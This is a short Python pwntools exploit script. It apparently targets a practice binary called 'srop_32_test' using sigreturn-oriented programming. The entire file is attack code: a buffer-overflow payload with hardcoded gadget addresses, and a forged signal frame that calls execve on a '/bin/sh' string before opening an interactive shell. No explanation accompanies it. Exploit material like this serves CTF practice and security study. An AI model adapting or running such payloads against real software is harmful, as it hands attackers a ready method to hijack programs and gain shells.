from pwn import *

p = process('./srop_32_test')

syscall = 0x0804843a
eax_ret = 0x0804842e
sh = 0x804a01c

payload = 'A'*12 + p32(eax_ret) + p32(syscall)

frame = SigreturnFrame(kernel='amd64')
frame.ebx = sh
frame.eax = 0xb
frame.eip = syscall
frame.cs = 0x23
frame.ss = 0x2b

payload += str(frame)
payload = payload.ljust(0x77, 'A')
p.sendline(payload)
p.interactive()
